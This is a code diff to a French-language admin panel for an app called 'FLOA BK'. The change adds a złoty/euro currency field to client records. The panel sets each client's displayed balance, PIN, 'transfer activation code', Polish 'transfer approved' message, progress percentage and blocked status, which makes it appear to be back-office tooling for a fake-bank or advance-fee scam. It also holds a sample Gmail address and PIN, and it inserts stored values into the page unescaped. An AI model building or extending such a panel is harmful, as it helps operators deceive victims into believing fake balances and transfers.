@@ -38,7 +38,8 @@ h3{font-size:15px}
       <div><label>Nom complet</label><input id="nom" placeholder="KWIATKOWSKI PW"></div>
       <div><label>Adresse Gmail</label><input id="email" type="email" placeholder="nom@gmail.com"></div>
       <div><label>Code PIN (6 chiffres)</label><input id="pin" maxlength="6" placeholder="973018"></div>
-      <div><label>Montant initial (zł)</label><input id="montant" type="number" placeholder="10000"></div>
+      <div><label>Montant initial</label><input id="montant" type="number" placeholder="10000"></div>
+      <div><label>Devise</label><select id="devise"><option value="zł">zł - Zloty polonais (PLN)</option><option value="€">€ - Euro (EUR)</option></select></div>
       <div><label>Code d'activation virement</label><input id="code" placeholder="ACT123"></div>
       <div><label>Message après activation</label><input id="msg" placeholder="Przelew zatwierdzony ✓"></div>
       <div><label>Pays</label><input id="pays" placeholder="Pologne"></div>
@@ -59,7 +60,7 @@ h3{font-size:15px}
     <h3 style="margin:0 0 10px">Clients enregistrés</h3>
     <div style="overflow:auto">
       <table>
-        <thead><tr><th>Client</th><th>PIN</th><th>Montant</th><th>Code</th><th>%</th><th>Action</th></tr></thead>
+        <thead><tr><th>Client</th><th>PIN</th><th>Montant</th><th>Devise</th><th>Code</th><th>%</th><th>Action</th></tr></thead>
         <tbody id="tb"></tbody>
       </table>
     </div>
@@ -117,6 +118,7 @@ onValue(clientsRef, snap => {
       email: 'avogodans61@gmail.com',
       pin: '973018',
       montant: 10000,
+      devise: 'zł',
       code: 'ACT123',
       msg: 'Przelew zatwierdzony ✓',
       pct: 100,
@@ -134,7 +136,8 @@ function render(){
     <tr>
       <td><b>${v.nom}</b><br><span style="color:#6b7280;font-size:10px">${v.email}${v.blocked?' <span style="color:#dc2626;font-weight:700">[BLOQUÉ]</span>':''}</span></td>
       <td><span class="badge">${v.pin}</span></td>
-      <td>${Number(v.montant).toLocaleString('pl-PL')} zł</td>
+      <td>${Number(v.montant).toLocaleString('pl-PL')} ${v.devise||'zł'}</td>
+      <td><span style="font-weight:700;color:var(--p)">${v.devise||'zł'}</span></td>
       <td>${v.code}</td>
       <td>${v.pct}%</td>
       <td>
@@ -142,7 +145,7 @@ function render(){
         <button onclick="delClient('${id}')" style="padding:4px 8px;font-size:10px;background:#fee;color:#900;border:1px solid #fcc;border-radius:4px;margin-left:4px">Supprimer</button>
       </td>
     </tr>`).join('');
-  $('tb').innerHTML = rows || '<tr><td colspan="6" style="text-align:center;color:#888;padding:20px">Aucun client</td></tr>';
+  $('tb').innerHTML = rows || '<tr><td colspan="7" style="text-align:center;color:#888;padding:20px">Aucun client</td></tr>';
 }
 
 $('saveBtn').onclick = () => {
@@ -151,6 +154,7 @@ $('saveBtn').onclick = () => {
     email: $('email').value.trim().toLowerCase(),
     pin: $('pin').value.trim(),
     montant: Number($('montant').value)||0,
+    devise: $('devise').value,
     code: $('code').value.trim(),
     msg: $('msg').value.trim(),
     pct: Number($('pct').value),
@@ -162,20 +166,20 @@ $('saveBtn').onclick = () => {
   if(!o.nom ||!o.email ||!o.pin){ alert('Nom, Email et PIN obligatoires'); return; }
   if(editId){ update(ref(db, 'clients/'+editId), o); } else { push(clientsRef, {...o, created: Date.now()}); }
   resetForm();
-  alert('Client enregistré. Visible instantanément dans l\'application.');
+  alert('Client enregistré avec devise ' + o.devise + '. Visible instantanément dans FLOA BK.');
 };
 
 $('resetBtn').onclick = resetForm;
 
 function resetForm(){
   ['nom','email','pin','montant','code','msg','pays','adresse','tel'].forEach(i=>$(i).value='');
-  $('pct').value=100; $('pv').textContent='100'; editId=null;
+  $('devise').value='zł'; $('pct').value=100; $('pv').textContent='100'; editId=null;
 }
 
 window.editClient = (id) => {
   const v = data[id]; editId = id;
   $('nom').value=v.nom; $('email').value=v.email; $('pin').value=v.pin;
-  $('montant').value=v.montant; $('code').value=v.code; $('msg').value=v.msg;
+  $('montant').value=v.montant; $('devise').value=v.devise||'zł'; $('code').value=v.code; $('msg').value=v.msg;
   $('pct').value=v.pct; $('pv').textContent=v.pct;
   $('pays').value=v.pays||''; $('adresse').value=v.adresse||''; $('tel').value=v.tel||'';
   window.scrollTo({top:0,behavior:'smooth'});
@@ -188,7 +192,7 @@ window.delClient = (id) => {
 };
 
 function refreshLists(){
-  const opts = Object.entries(data).map(([id,v])=>`<option value="${id}">${v.nom} - ${v.email}${v.blocked?' (BLOQUÉ)':''}</option>`).join('');
+  const opts = Object.entries(data).map(([id,v])=>`<option value="${id}">${v.nom} - ${v.email} (${v.devise||'zł'})${v.blocked?' (BLOQUÉ)':''}</option>`).join('');
   if($('clientAccess')) $('clientAccess').innerHTML = opts;
   if($('clientAction')) $('clientAction').innerHTML = opts;
 }
